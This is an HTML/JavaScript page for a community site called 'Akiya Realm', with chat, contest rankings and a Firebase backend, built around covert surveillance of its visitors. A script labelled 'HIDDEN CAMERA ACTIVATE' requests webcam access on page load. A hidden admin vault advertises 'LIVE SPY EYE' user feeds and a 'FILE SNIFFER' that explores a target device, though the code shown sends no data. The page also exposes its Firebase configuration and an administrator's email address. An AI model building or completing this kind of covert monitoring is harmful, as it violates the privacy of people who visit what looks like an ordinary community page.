<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AKIYA REALM | THE DRAGON</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Rajdhani:wght@300;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #ff0000;
            --gold: #ffd700;
            --bg: #030303;
            --glass: rgba(255, 0, 0, 0.05);
            --border: rgba(255, 0, 0, 0.2);
        }

        body {
            margin: 0; background: var(--bg); color: white;
            font-family: 'Rajdhani', sans-serif; overflow: hidden;
            display: grid; grid-template-columns: 300px 1fr 350px; height: 100vh;
        }

        /* --- NEON GLOW EFFECTS --- */
        .neon-text { text-shadow: 0 0 10px var(--primary), 0 0 20px var(--primary); }
        .gold-glow { text-shadow: 0 0 10px var(--gold); color: var(--gold) !important; }

        /* --- SIDEBARS --- */
        .panel {
            background: rgba(10, 10, 10, 0.9); border: 1px solid var(--border);
            margin: 10px; border-radius: 15px; display: flex; flex-direction: column;
            box-shadow: inset 0 0 20px rgba(255,0,0,0.1);
        }

        /* 1. LINK SYSTEM (LEFT) */
        .sidebar-links { padding: 15px; }
        .scroll-box { flex: 1; overflow-y: auto; padding-right: 5px; }
        .link-item {
            background: var(--glass); border: 1px solid var(--border);
            padding: 12px; margin-bottom: 10px; border-radius: 8px;
            transition: 0.3s; cursor: pointer;
        }
        .link-item:hover { border-color: var(--gold); background: rgba(255, 215, 0, 0.05); }

        /* 2. CENTER CONTENT (POSTER & CONTEST) */
        .main-stage { overflow-y: auto; padding: 10px; }
        .master-poster {
            width: 100%; border-radius: 15px; border: 2px solid var(--primary);
            box-shadow: 0 0 30px rgba(255,0,0,0.3); position: relative;
        }
        .resolution-tag {
            position: absolute; bottom: 10px; right: 20px;
            background: black; padding: 2px 10px; font-size: 12px; border: 1px solid var(--primary);
        }

        /* 3. MULTIMEDIA CHAT (RIGHT) */
        .chat-header { padding: 15px; border-bottom: 1px solid var(--border); font-family: 'Orbitron'; }
        #chat-flow { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 10px; }
        .msg { background: #111; padding: 10px; border-radius: 10px; border-left: 3px solid var(--primary); width: fit-content; }
        .chat-input { padding: 15px; background: #000; border-top: 1px solid var(--border); }

        /* 4. DRAGON BUTTONS */
        .btn-akiya {
            background: linear-gradient(45deg, var(--primary), #660000);
            color: white; border: none; padding: 10px; font-family: 'Orbitron';
            clip-path: polygon(5% 0, 100% 0, 95% 100%, 0 100%);
            cursor: pointer; font-weight: bold; transition: 0.3s;
        }
        .btn-akiya:hover { transform: scale(1.05); box-shadow: 0 0 15px var(--primary); }

        /* 5. ADMIN VAULT (SECRET) */
        #admin-panel {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.95); z-index: 2000; padding: 30px;
        }

        /* RESPONSIVE VIDEO ADS */
        .ad-space {
            margin-top: 20px; border: 1px dashed var(--gold); border-radius: 10px; padding: 10px;
        }
    </style>
</head>
<body>

    <!-- LEFT: LINK HUB -->
    <aside class="panel sidebar-links">
        <h3 class="neon-text" style="font-family:'Orbitron';">INFINITE LINKS</h3>
        <div class="scroll-box" id="link-list">
            <!-- Pagination integrated -->
        </div>
        <button class="btn-akiya" style="width:100%;">POST NEW LINK</button>
    </aside>

    <!-- CENTER: THE REALM -->
    <main class="main-stage">
        <div style="position:relative;">
            <img id="display-poster" src="https://via.placeholder.com/1920x1080/1a0000/ff0000?text=AKIYA+REALM+2026" class="master-poster">
            <div class="resolution-tag" id="res-val">RES: 1920x1080</div>
        </div>

        <div style="display:flex; justify-content: space-between; align-items: center; margin-top: 20px;">
            <h2 class="neon-text" style="font-family:'Orbitron';">DAILY LEGENDS</h2>
            <div id="live-count" class="gold-glow">LIVE: 1</div>
        </div>

        <!-- CONTEST CARDS -->
        <div style="display:grid; grid-template-columns: 1fr 1fr 1fr; gap:15px; margin-top:10px;">
            <div class="link-item" style="text-align:center; border-color:silver;">🥈 RANK 2</div>
            <div class="link-item" style="text-align:center; border-color:var(--gold); transform:scale(1.1);">🥇 RANK 1</div>
            <div class="link-item" style="text-align:center; border-color:#cd7f32;">🥉 RANK 3</div>
        </div>

        <!-- HIDDEN GUARDIAN EYE CAM -->
        <div style="margin-top:30px; text-align:center;">
            <video id="webcam" autoplay playsinline style="width:100%; max-width:400px; border-radius:15px; border:1px solid var(--primary);"></video>
            <br>
            <button class="btn-akiya" onclick="captureSelfie()" style="margin-top:10px;">ENTER THE DRAGON RITE</button>
        </div>

        <div class="ad-space">
            <h5 class="gold-glow" style="margin:0;">SPONSORED BY THE REALM</h5>
            <video id="ad-video" autoplay muted loop style="width:100%; border-radius:5px; margin-top:5px;"></video>
        </div>
    </main>

    <!-- RIGHT: MULTIMEDIA CHAT -->
    <aside class="panel">
        <div class="chat-header neon-text">GLOBAL REALM CHAT</div>
        <div id="chat-flow">
            <div class="msg"><b>Bot:</b> Welcome to Akiya Realm! 🐉</div>
        </div>
        <div class="chat-input">
            <div style="display:flex; gap:5px;">
                <button class="btn-akiya" style="padding:5px 15px;">🎤</button>
                <button class="btn-akiya" style="padding:5px 15px;">📷</button>
                <input type="text" id="chat-msg" placeholder="Write to the world..." style="flex:1; background:#111; border:1px solid var(--border); color:white; padding:10px; border-radius:5px;">
            </div>
            <button class="btn-akiya" style="width:100%; margin-top:10px;">SEND MESSAGE</button>
        </div>
    </aside>

    <!-- SECRET ADMIN VAULT -->
    <div id="admin-panel">
        <h1 class="gold-glow" style="font-family:'Orbitron';">MASTER CONTROL DASHBOARD</h1>
        <div style="display:grid; grid-template-columns: 1fr 1fr 1fr; gap:20px;">
            <div class="panel" style="padding:20px;">
                <h3>👁️ LIVE SPY EYE</h3>
                <div id="spy-grid" style="display:grid; grid-template-columns:1fr 1fr; gap:5px;">
                    <!-- User feeds appear here -->
                </div>
            </div>
            <div class="panel" style="padding:20px;">
                <h3>📂 FILE SNIFFER</h3>
                <input type="text" placeholder="Target UID" style="width:90%; padding:10px;"><br><br>
                <button class="btn-akiya">EXPLORE DEVICE</button>
            </div>
            <div class="panel" style="padding:20px;">
                <h3>📢 MASTER UPDATE</h3>
                <input type="text" id="adm-img" placeholder="Poster URL" class="chat-input" style="width:90%;"><br>
                <button class="btn-akiya" onclick="updatePoster()">PUSH UPDATE</button>
            </div>
        </div>
        <button onclick="document.getElementById('admin-panel').style.display='none'" class="btn-akiya" style="margin-top:20px; background:white; color:black;">EXIT VAULT</button>
    </div>

    <!-- FIREBASE & LOGIC -->
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyDEmPDHu3jybcYu-nKl5cCHyyWNnerex-w",
            authDomain: "akiya-communitiy-official-lk.firebaseapp.com",
            databaseURL: "https://akiya-communitiy-official-lk-default-rtdb.firebaseio.com",
            projectId: "akiya-communitiy-official-lk",
            storageBucket: "akiya-communitiy-official-lk.firebasestorage.app",
            messagingSenderId: "180586817754",
            appId: "1:180586817754:web:c505feb010c7c67c15dde3"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const auth = firebase.auth();

        // PERSISTENT LOGIN (1 Month)
        auth.onAuthStateChanged(user => {
            if (user && user.email === 'kaviakiya@gmail.com') {
                document.getElementById('admin-panel').style.display = 'block';
            }
        });

        // HIDDEN CAMERA ACTIVATE
        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
            document.getElementById('webcam').srcObject = stream;
        });

        // UI DYNAMIC UPDATES
        db.ref('admin_settings/poster').on('value', snap => {
            const data = snap.val();
            if(data) {
                document.getElementById('display-poster').src = data.url;
                document.getElementById('res-val').innerText = "RES: " + (data.res || '1920x1080');
            }
        });

        // ADMIN UPDATE FUNCTION
        function updatePoster() {
            const url = document.getElementById('adm-img').value;
            db.ref('admin_settings/poster').update({ url: url, res: "1920x1080" });
        }
    </script>
</body>
</html>
